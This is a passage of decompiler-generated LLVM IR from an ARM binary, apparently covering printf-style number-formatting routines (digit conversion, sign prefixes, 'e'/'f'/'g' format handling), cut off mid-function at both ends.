  %v0_115fc = load i32, i32* %r6.global-to-local, align 4
  %v2_11604 = call i32 @function_c864(i32 %v0_115fc, i32 %v0_11600)
  %v0_11608 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11608, i32* @r1, align 4
  store i32 %v2_11604, i32* %r4.global-to-local, align 4
  store i32 %v0_115fc, i32* @r0, align 4
  %v0_11614 = call i32 @function_148a4()
  store i32 %v0_11614, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1161c

dec_label_pc_1161c:                               ; preds = %dec_label_pc_115a0, %dec_label_pc_115fc
  %v0_11624 = phi i32 [ %v2_115f0, %dec_label_pc_115a0 ], [ %v2_11604, %dec_label_pc_115fc ]
  %v3_1161c = load i32, i32* %stack_var_0, align 4
  %v2_11620 = icmp ugt i32 %v0_11624, 8
  %v7_11620 = icmp eq i32 %v0_11624, 9
  store i1 %v7_11620, i1* %cpsr_z.global-to-local, align 1
  %v1_11628 = add i32 %v0_11624, 48
  %v0_11630 = load i32, i32* %r8.global-to-local, align 4
  %v1_11630 = add i32 %v0_11630, -1
  store i32 %v1_11630, i32* %r8.global-to-local, align 4
  %v2_11634 = xor i1 %v7_11620, true
  %v3_11634 = and i1 %v2_11620, %v2_11634
  %extract.t = trunc i32 %v1_11628 to i8
  br i1 %v3_11634, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1161c
  %v2_11624 = add i32 %v3_1161c, %v0_11624
  %extract.t6 = trunc i32 %v2_11624 to i8
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1161c, %bb18
  %v0_1163c.off0 = phi i8 [ %extract.t, %dec_label_pc_1161c ], [ %extract.t6, %bb18 ]
  %v0_11638 = load i32, i32* %r6.global-to-local, align 4
  %v1_11638 = load i32, i32* %sl.global-to-local, align 4
  %v2_11638 = or i32 %v1_11638, %v0_11638
  %v4_11638 = icmp eq i32 %v2_11638, 0
  store i1 %v4_11638, i1* %cpsr_z.global-to-local, align 1
  %v3_1163c = inttoptr i32 %v1_11630 to i8*
  store i8 %v0_1163c.off0, i8* %v3_1163c, align 1
  %v0_11640 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11640, label %dec_label_pc_11644, label %dec_label_pc_11590thread-pre-split

dec_label_pc_11644:                               ; preds = %bb19
  %v2_11644 = load i8, i8* %stack_var_-40, align 1
  %v2_11648 = icmp eq i8 %v2_11644, 0
  store i1 %v2_11648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11648, label %dec_label_pc_11644..thread2_crit_edge, label %bb20

dec_label_pc_11644..thread2_crit_edge:            ; preds = %dec_label_pc_11644
  %v0_11654.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb20:                                             ; preds = %dec_label_pc_11644
  %v3_11650 = load i32, i32* %r8.global-to-local, align 4
  %v4_11650 = add i32 %v3_11650, -1
  %v5_11650 = inttoptr i32 %v4_11650 to i8*
  store i8 45, i8* %v5_11650, align 1
  %v6_11650 = load i32, i32* %r8.global-to-local, align 4
  %v7_11650 = add i32 %v6_11650, -1
  store i32 %v7_11650, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11644..thread2_crit_edge, %bb20
  %v0_11654 = phi i32 [ %v0_11654.pre, %dec_label_pc_11644..thread2_crit_edge ], [ %v7_11650, %bb20 ]
  ret i32 %v0_11654

; uselistorder directives
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 8, 6, 7, 0, 9 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 5, 2, 3, 4, 6, 8, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2, 3 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_1161c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_11554, { 1, 0 }
}

define i32 @function_11660(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11660:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp148 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-50 = alloca i8, align 1
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-86 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-85 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11660 = load i32, i32* @r4, align 4
  store i32 %v3_11660, i32* %stack_var_-36, align 4
  %v6_11660 = load i32, i32* @r5, align 4
  %v9_11660 = load i32, i32* @r6, align 4
  %v12_11660 = load i32, i32* @r7, align 4
  %v15_11660 = load i32, i32* @r8, align 4
  %v18_11660 = load i32, i32* @sb, align 4
  %v1_11668 = add i32 %tmp, 8
  %v2_11668 = inttoptr i32 %v1_11668 to i8*
  %v3_11668 = load i8, i8* %v2_11668, align 1
  %v4_11668 = zext i8 %v3_11668 to i32
  store i32 %v4_11668, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %fp.global-to-local, align 4
  %v1_11670 = or i32 %v4_11668, 32
  %v2_11674 = ptrtoint i32* %stack_var_-184 to i32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11678 = icmp ult i32 %v1_11670, 97
  store i1 %v6_11678, i1* %cpsr_n.global-to-local, align 1
  %v7_11678 = icmp eq i32 %v1_11670, 97
  store i1 %v7_11678, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v2_11684 = load i32, i32* %arg4, align 4
  store i32 %v2_11684, i32* %r8.global-to-local, align 4
  br i1 %v7_11678, label %bb, label %bb177

bb:                                               ; preds = %dec_label_pc_11660
  %v2_11688 = add nuw nsw i32 %v4_11668, 6
  store i32 %v2_11688, i32* %r3.global-to-local, align 4
  br label %bb177

bb177:                                            ; preds = %dec_label_pc_11660, %bb
  %v1_1169c = phi i32 [ 101, %dec_label_pc_11660 ], [ %v2_11688, %bb ]
  store i32 %arg2, i32* %stack_var_-192, align 4
  %v1_11694 = add i32 %tmp, 12
  %v2_11694 = inttoptr i32 %v1_11694 to i32*
  %v3_11694 = load i32, i32* %v2_11694, align 4
  store i32 %v3_11694, i32* %r2.global-to-local, align 4
  %v1_11698 = add i32 %tmp, 4
  %v2_11698 = inttoptr i32 %v1_11698 to i32*
  %v3_11698 = load i32, i32* %v2_11698, align 4
  store i32 %v3_11698, i32* %r1.global-to-local, align 4
  br i1 %v7_11678, label %bb178, label %bb179

bb178:                                            ; preds = %bb177
  %v2_1169c = urem i32 %v1_1169c, 256
  store i32 %v2_1169c, i32* %r7.global-to-local, align 4
  br label %bb179

bb179:                                            ; preds = %bb177, %bb178
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_116a0 = icmp slt i32 %v2_11684, 0
  store i1 %v1_116a0, i1* %cpsr_n.global-to-local, align 1
  %v2_116a0 = icmp eq i32 %v2_11684, 0
  store i1 %v2_116a0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v1_116a0, label %bb180, label %bb181

bb180:                                            ; preds = %bb179
  store i32 6, i32* %r8.global-to-local, align 4
  br label %bb181

bb181:                                            ; preds = %bb179, %bb180
  %v1_116ac = and i32 %v3_11694, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_116ac = icmp eq i32 %v1_116ac, 0
  store i1 %v2_116ac, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-50, align 1
  store i32 %arg1, i32* %stack_var_-192, align 4
  br i1 %v2_116ac, label %dec_label_pc_116c0, label %dec_label_pc_11730

dec_label_pc_116c0:                               ; preds = %bb181
  %v1_116c0 = urem i32 %v3_11694, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_116c0 = icmp eq i32 %v1_116c0, 0
  store i1 %v2_116c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116c0, label %.thread10, label %dec_label_pc_11730

dec_label_pc_11730:                               ; preds = %dec_label_pc_116c0, %bb181
  %storemerge = phi i8 [ 43, %bb181 ], [ 32, %dec_label_pc_116c0 ]
  store i8 %storemerge, i8* %stack_var_-50, align 1
  %v2_11734 = add i32 %tmp, 16
  %v3_11734 = inttoptr i32 %v2_11734 to i32*
  store i32 32, i32* %v3_11734, align 4
  %v0_1173c = load i32, i32* %r7.global-to-local, align 4
  %v1_1173c = add i32 %v0_1173c, -96
  %v3_1173c = sub i32 95, %v0_1173c
  %v4_1173c = and i32 %v3_1173c, %v0_1173c
  %v5_1173c = icmp slt i32 %v4_1173c, 0
  store i1 %v5_1173c, i1* %cpsr_v.global-to-local, align 1
  %v6_1173c = icmp slt i32 %v1_1173c, 0
  store i1 %v6_1173c, i1* %cpsr_n.global-to-local, align 1
  %v7_1173c = icmp eq i32 %v0_1173c, 96
  store i1 %v7_1173c, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-168, align 4
  %tmp239 = icmp ult i32 %v0_1173c, 97
  br i1 %tmp239, label %bb182, label %.thread102

bb182:                                            ; preds = %dec_label_pc_11730
  store i32 12, i32* %r3.global-to-local, align 4
  br label %.thread102

.thread102:                                       ; preds = %dec_label_pc_11730, %bb182
  %v4_11754 = phi i32 [ 12, %bb182 ], [ 3, %dec_label_pc_11730 ]
  %v4_11754..v1_116e4 = select i1 %tmp239, i32 %v4_11754, i32 8
  store i32 ptrtoint ([4 x i8]* @global_var_16f7c.529 to i32), i32* %r2.global-to-local, align 4
  %v2_11760 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_11760, i32* %r6.global-to-local, align 4
  %v2_11764 = add i32 %v4_11754..v1_116e4, ptrtoint ([4 x i8]* @global_var_16f7c.529 to i32)
  store i32 %v2_11764, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11be8

.thread10:                                        ; preds = %dec_label_pc_116c0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  %v2_117ec = ptrtoint i32* %stack_var_-85 to i32
  store i32 %v2_117ec, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_117f4

dec_label_pc_117f4:                               ; preds = %dec_label_pc_11864, %.thread10
  %v3_11808 = phi i32 [ %v0_11854, %dec_label_pc_11864 ], [ %v3_11660, %.thread10 ]
  %v1_11808 = phi i1 [ %v5_11868, %dec_label_pc_11864 ], [ false, %.thread10 ]
  %v0_11808 = phi i1 [ %v6_11868, %dec_label_pc_11864 ], [ false, %.thread10 ]
  %v2_11808 = xor i1 %v1_11808, %v0_11808
  br i1 %v2_11808, label %bb184, label %bb183

bb183:                                            ; preds = %dec_label_pc_117f4
  %v4_11808 = sub i32 0, %v3_11808
  store i32 %v4_11808, i32* @r4, align 4
  br label %bb184

bb184:                                            ; preds = %dec_label_pc_117f4, %bb183
  %v0_1180c = phi i32 [ %v3_11808, %dec_label_pc_117f4 ], [ %v4_11808, %bb183 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1180c = icmp slt i32 %v0_1180c, 0
  store i1 %v1_1180c, i1* %cpsr_n.global-to-local, align 1
  %v2_1180c = icmp eq i32 %v0_1180c, 0
  store i1 %v2_1180c, i1* %cpsr_z.global-to-local, align 1
  %v0_11828 = load i32, i32* %sl.global-to-local, align 4
  %v1_11828 = add i32 %v0_11828, 9
  store i32 %v1_11828, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11830

dec_label_pc_11830:                               ; preds = %dec_label_pc_11830, %bb184
  %v0_11830 = phi i32 [ %v0_11854, %dec_label_pc_11830 ], [ %v0_1180c, %bb184 ]
  store i32 %v0_11830, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_11838 = call i32 @function_c864(i32 %v0_11830, i32 10)
  %v0_1183c = load i32, i32* %r5.global-to-local, align 4
  %v1_1183c = add i32 %v0_1183c, 1
  store i32 %v1_1183c, i32* %r5.global-to-local, align 4
  %v1_11840 = add i32 %v2_11838, 48
  store i32 %v1_11840, i32* %r2.global-to-local, align 4
  %v1_11844 = load i32, i32* %sl.global-to-local, align 4
  %v2_11844 = sub i32 %v1_11844, %v1_1183c
  store i32 %v2_11844, i32* %r3.global-to-local, align 4
  %v0_11848 = load i32, i32* @r4, align 4
  store i32 %v0_11848, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  %v1_11850 = trunc i32 %v1_11840 to i8
  %v3_11850 = inttoptr i32 %v2_11844 to i8*
  store i8 %v1_11850, i8* %v3_11850, align 1
  %v0_11854 = call i32 @function_148a4()
  store i32 %v0_11854, i32* %r0.global-to-local, align 4
  %v0_11858 = load i32, i32* %r5.global-to-local, align 4
  %v1_11858 = add i32 %v0_11858, -8
  %v3_11858 = sub i32 7, %v0_11858
  %v4_11858 = and i32 %v3_11858, %v0_11858
  %v5_11858 = icmp slt i32 %v4_11858, 0
  store i1 %v5_11858, i1* %cpsr_v.global-to-local, align 1
  %v6_11858 = icmp slt i32 %v1_11858, 0
  store i1 %v6_11858, i1* %cpsr_n.global-to-local, align 1
  %v7_11858 = icmp eq i32 %v0_11858, 8
  store i1 %v7_11858, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_11854, i32* @r4, align 4
  %v7_11860 = icmp slt i32 %v0_11858, 9
  br i1 %v7_11860, label %dec_label_pc_11830, label %dec_label_pc_11864

dec_label_pc_11864:                               ; preds = %dec_label_pc_11830
  %v0_11864 = load i32, i32* %r6.global-to-local, align 4
  %v1_11864 = add i32 %v0_11864, 1
  store i32 %v1_11864, i32* %r6.global-to-local, align 4
  %v3_11868 = sub i32 -1, %v0_11864
  %v4_11868 = and i32 %v1_11864, %v3_11868
  %v5_11868 = icmp slt i32 %v4_11868, 0
  store i1 %v5_11868, i1* %cpsr_v.global-to-local, align 1
  %v6_11868 = icmp slt i32 %v0_11864, 0
  store i1 %v6_11868, i1* %cpsr_n.global-to-local, align 1
  %v7_11868 = icmp eq i32 %v0_11864, 0
  store i1 %v7_11868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11868, label %dec_label_pc_117f4, label %dec_label_pc_11870

dec_label_pc_11870:                               ; preds = %dec_label_pc_11864
  %v0_11870 = load i32, i32* %r7.global-to-local, align 4
  %v1_11870 = add i32 %v0_11870, -96
  %v3_11870 = sub i32 95, %v0_11870
  %v4_11870 = and i32 %v3_11870, %v0_11870
  %v5_11870 = icmp slt i32 %v4_11870, 0
  store i1 %v5_11870, i1* %cpsr_v.global-to-local, align 1
  %v6_11870 = icmp slt i32 %v1_11870, 0
  store i1 %v6_11870, i1* %cpsr_n.global-to-local, align 1
  %v7_11870 = icmp eq i32 %v0_11870, 96
  store i1 %v7_11870, i1* %cpsr_z.global-to-local, align 1
  %tmp240 = icmp ult i32 %v0_11870, 97
  br i1 %tmp240, label %bb185, label %thread-pre-split

bb185:                                            ; preds = %dec_label_pc_11870
  %v5_1187c = add i32 %v0_11870, 32
  store i32 %v5_1187c, i32* %r3.global-to-local, align 4
  %v5_11880 = urem i32 %v5_1187c, 256
  store i32 %v5_11880, i32* %r7.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_11870, %bb185
  %stack_var_-66.0105111 = phi i8 [ 69, %bb185 ], [ %tmp148, %dec_label_pc_11870 ]
  %v0_118a0 = phi i32 [ %v5_11880, %bb185 ], [ %v0_11870, %dec_label_pc_11870 ]
  %v7_11884 = icmp eq i32 %v0_118a0, 103
  %.226 = zext i1 %v7_11884 to i32
  store i32 %.226, i32* %r3.global-to-local, align 4
  %v0_11890 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11890 = icmp slt i32 %v0_11890, 0
  store i1 %v1_11890, i1* %cpsr_n.global-to-local, align 1
  %v2_11890 = icmp eq i32 %v0_11890, 0
  store i1 %v2_11890, i1* %cpsr_z.global-to-local, align 1
  %tmp188 = icmp slt i32 %v0_11890, 1
  br i1 %tmp188, label %.thread13, label %bb189

.thread13:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb191

bb189:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11898 = icmp eq i1 %v7_11884, false
  store i1 %v2_11898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11898, label %bb191, label %bb190

bb190:                                            ; preds = %bb189
  %v2_1189c = add i32 %v0_11890, -1
  store i32 %v2_1189c, i32* %r8.global-to-local, align 4
  br label %bb191

bb191:                                            ; preds = %.thread13, %bb189, %bb190
  %v0_118ac = phi i32 [ %v0_11890, %.thread13 ], [ %v0_11890, %bb189 ], [ %v2_1189c, %bb190 ]
  %v1_118a0 = add i32 %v0_118a0, -102
  %v3_118a0 = sub i32 101, %v0_118a0
  %v4_118a0 = and i32 %v3_118a0, %v0_118a0
  %v5_118a0 = icmp slt i32 %v4_118a0, 0
  store i1 %v5_118a0, i1* %cpsr_v.global-to-local, align 1
  %v6_118a0 = icmp slt i32 %v1_118a0, 0
  store i1 %v6_118a0, i1* %cpsr_n.global-to-local, align 1
  %v7_118a0 = icmp eq i32 %v0_118a0, 102
  store i1 %v7_118a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_118a0, label %dec_label_pc_118ac, label %bb192

bb192:                                            ; preds = %bb191
  store i32 %v0_118ac, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_118d0

dec_label_pc_118ac:                               ; preds = %bb191
  %v1_118ac = load i32, i32* %sb.global-to-local, align 4
  %v2_118ac = add i32 %v1_118ac, %v0_118ac
  store i32 %v2_118ac, i32* %ip.global-to-local, align 4
  %v2_118b0 = add i32 %v2_118ac, 1
  %v4_118b0 = sub i32 0, %v2_118ac
  %v5_118b0 = and i32 %v2_118b0, %v4_118b0
  %v6_118b0 = icmp slt i32 %v5_118b0, 0
  store i1 %v6_118b0, i1* %cpsr_v.global-to-local, align 1
  %v7_118b0 = icmp slt i32 %v2_118b0, 0
  store i1 %v7_118b0, i1* %cpsr_n.global-to-local, align 1
  %v8_118b0 = icmp eq i32 %v2_118b0, 0
  store i1 %v8_118b0, i1* %cpsr_z.global-to-local, align 1
  %v6_118b4 = icmp slt i32 %v2_118ac, -1
  br i1 %v6_118b4, label %dec_label_pc_118b8, label %dec_label_pc_118d0

dec_label_pc_118b8:                               ; preds = %dec_label_pc_118ac
  %v2_118b8 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_118b8, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_118c4 = bitcast i32* %stack_var_-87 to i8*
  %v3_118c4 = call i32 @function_ec20(i8* %v2_118c4, i32 48)
  store i32 %v3_118c4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_118d0

dec_label_pc_118d0:                               ; preds = %dec_label_pc_118ac, %bb192, %dec_label_pc_118b8
  %v1_1191467 = phi i32 [ %v0_11854, %bb192 ], [ %v3_118c4, %dec_label_pc_118b8 ], [ %v0_11854, %dec_label_pc_118ac ]
  %v1_118f8 = phi i32 [ %v0_118ac, %bb192 ], [ -1, %dec_label_pc_118b8 ], [ %v2_118ac, %dec_label_pc_118ac ]
  %v1_118d4 = add i32 %v1_118f8, -16
  %v3_118d4 = sub i32 15, %v1_118f8
  %v4_118d4 = and i32 %v3_118d4, %v1_118f8
  %v5_118d4 = icmp slt i32 %v4_118d4, 0
  store i1 %v5_118d4, i1* %cpsr_v.global-to-local, align 1
  %v6_118d4 = icmp slt i32 %v1_118d4, 0
  store i1 %v6_118d4, i1* %cpsr_n.global-to-local, align 1
  %v7_118d4 = icmp eq i32 %v1_118f8, 16
  store i1 %v7_118d4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-86, align 4
  %v2_118e0 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_118e0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-87, align 4
  %v7_118e8 = icmp sgt i32 %v1_118f8, 16
  br i1 %v7_118e8, label %.thread18, label %dec_label_pc_118f4

.thread18:                                        ; preds = %dec_label_pc_118d0
  store i32 0, i32* %r0.global-to-local, align 4
  %v10_118ec = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v10_118ec, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_118f4:                               ; preds = %dec_label_pc_118d0
  %v2_118f4 = ptrtoint i32* %stack_var_-86 to i32
  %v2_118f8 = add i32 %v1_118f8, %v2_118f4
  store i32 %v2_118f8, i32* %r3.global-to-local, align 4
  %v1_118fc = add i32 %v2_118f8, 2
  %v2_118fc = inttoptr i32 %v1_118fc to i8*
  %v3_118fc = load i8, i8* %v2_118fc, align 1
  %v4_118fc = zext i8 %v3_118fc to i32
  store i32 %v4_118fc, i32* %r2.global-to-local, align 4
  store i32 %v1_118fc, i32* %r1.global-to-local, align 4
  %v2_11904 = icmp ugt i8 %v3_118fc, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11904 = icmp ult i8 %v3_118fc, 52
  store i1 %v6_11904, i1* %cpsr_n.global-to-local, align 1
  %v7_11904 = icmp eq i8 %v3_118fc, 52
  store i1 %v7_11904, i1* %cpsr_z.global-to-local, align 1
  %v2_11908 = xor i1 %v2_11904, true
  %v3_11908 = or i1 %v7_11904, %v2_11908
  br i1 %v3_11908, label %bb193, label %bb194

bb193:                                            ; preds = %dec_label_pc_118f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb194

bb194:                                            ; preds = %dec_label_pc_118f4, %bb193
  %v1_1191466 = phi i32 [ %v1_1191467, %dec_label_pc_118f4 ], [ 0, %bb193 ]
  %v2_1190c = xor i1 %v7_11904, true
  %v3_1190c = and i1 %v2_11904, %v2_1190c
  br i1 %v3_1190c, label %bb195, label %.preheader

bb195:                                            ; preds = %bb194
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %.thread18, %bb194, %bb195, %.backedge
  %v1_11914 = phi i32 [ %v1_11914.pre, %.backedge ], [ 0, %.thread18 ], [ %v1_1191466, %bb194 ], [ 1, %bb195 ]
  %v0_11910 = phi i32 [ %v0_1191c, %.backedge ], [ %v10_118ec, %.thread18 ], [ %v1_118fc, %bb194 ], [ %v1_118fc, %bb195 ]
  %v1_11910 = add i32 %v0_11910, -1
  %v2_11910 = inttoptr i32 %v1_11910 to i8*
  %v3_11910 = load i8, i8* %v2_11910, align 1
  %v4_11910 = zext i8 %v3_11910 to i32
  store i32 %v1_11910, i32* %r1.global-to-local, align 4
  %v2_11914 = add i32 %v4_11910, %v1_11914
  store i32 %v2_11914, i32* %r3.global-to-local, align 4
  %v1_11918 = trunc i32 %v2_11914 to i8
  store i8 %v1_11918, i8* %v2_11910, align 1
  %v0_1191c = load i32, i32* %r1.global-to-local, align 4
  %v1_1191c = inttoptr i32 %v0_1191c to i8*
  %v2_1191c = load i8, i8* %v1_1191c, align 1
  %v3_1191c = zext i8 %v2_1191c to i32
  store i32 %v3_1191c, i32* %r2.global-to-local, align 4
  %v2_11920 = icmp ugt i8 %v2_1191c, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11920 = icmp ult i8 %v2_1191c, 57
  store i1 %v6_11920, i1* %cpsr_n.global-to-local, align 1
  %v7_11920 = icmp eq i8 %v2_1191c, 57
  store i1 %v7_11920, i1* %cpsr_z.global-to-local, align 1
  %v2_11924 = xor i1 %v2_11920, true
  %v3_11924 = or i1 %v7_11920, %v2_11924
  br i1 %v3_11924, label %bb196, label %bb197

bb196:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %.preheader, %bb196
  %v2_11928 = xor i1 %v7_11920, true
  %v3_11928 = and i1 %v2_11920, %v2_11928
  br i1 %v3_11928, label %bb198, label %._crit_edge

._crit_edge:                                      ; preds = %bb197
  %v1_11930.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb199

bb198:                                            ; preds = %bb197
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb199

bb199:                                            ; preds = %._crit_edge, %bb198
  %v1_11930 = phi i32 [ %v1_11930.pre, %._crit_edge ], [ 1, %bb198 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_1192c = icmp ult i8 %v2_1191c, 48
  store i1 %v6_1192c, i1* %cpsr_n.global-to-local, align 1
  %v7_1192c = icmp eq i8 %v2_1191c, 48
  store i1 %v7_1192c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1192c, label %.thread20, label %bb200

.thread20:                                        ; preds = %bb199
  %v2_11930 = or i32 %v1_11930, 1
  store i32 %v2_11930, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1193421 = icmp slt i32 %v2_11930, 0
  store i1 %v1_1193421, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb200:                                            ; preds = %bb199
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11934 = icmp slt i32 %v1_11930, 0
  store i1 %v1_11934, i1* %cpsr_n.global-to-local, align 1
  %v2_11934 = icmp eq i32 %v1_11930, 0
  store i1 %v2_11934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11934, label %dec_label_pc_1193c, label %.backedge

.backedge:                                        ; preds = %bb200, %.thread20
  %v1_11914.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_1193c:                               ; preds = %bb200
  store i32 %v2_118e0, i32* %r2.global-to-local, align 4
  %v2_11940 = ptrtoint i32* %stack_var_-86 to i32
  store i32 %v2_11940, i32* %r3.global-to-local, align 4
  %v2_11944 = sub i32 %v0_1191c, %v2_11940
  %v3_11944 = icmp uge i32 %v0_1191c, %v2_11940
  %v4_11944 = xor i32 %v0_1191c, %v2_11940
  %v5_11944 = xor i32 %v2_11944, %v0_1191c
  %v6_11944 = and i32 %v5_11944, %v4_11944
  %v7_11944 = icmp slt i32 %v6_11944, 0
  store i1 %v7_11944, i1* %cpsr_v.global-to-local, align 1
  %v8_11944 = icmp slt i32 %v2_11944, 0
  store i1 %v8_11944, i1* %cpsr_n.global-to-local, align 1
  %v9_11944 = icmp eq i32 %v0_1191c, %v2_11940
  store i1 %v9_11944, i1* %cpsr_z.global-to-local, align 1
  %v2_11948 = xor i1 %v3_11944, true
  %v3_11948 = or i1 %v9_11944, %v2_11948
  br i1 %v3_11948, label %bb201, label %.thread121

bb201:                                            ; preds = %dec_label_pc_1193c
  store i32 %v2_11940, i32* %r2.global-to-local, align 4
  store i32 %v2_11940, i32* %r1.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_1193c, %bb201
  %v2_11964 = phi i32 [ %v2_11940, %bb201 ], [ %v0_1191c, %dec_label_pc_1193c ]
  %v4_11954120 = phi i32 [ %v2_11940, %bb201 ], [ %v2_118e0, %dec_label_pc_1193c ]
  %v2_11950 = xor i1 %v9_11944, true
  %v3_11950 = and i1 %v3_11944, %v2_11950
  br i1 %v3_11950, label %bb202, label %.thread122

bb202:                                            ; preds = %.thread121
  %v4_11950 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v4_11950, i32* %r0.global-to-local, align 4
  %v5_11954 = add i32 %v4_11954120, 2
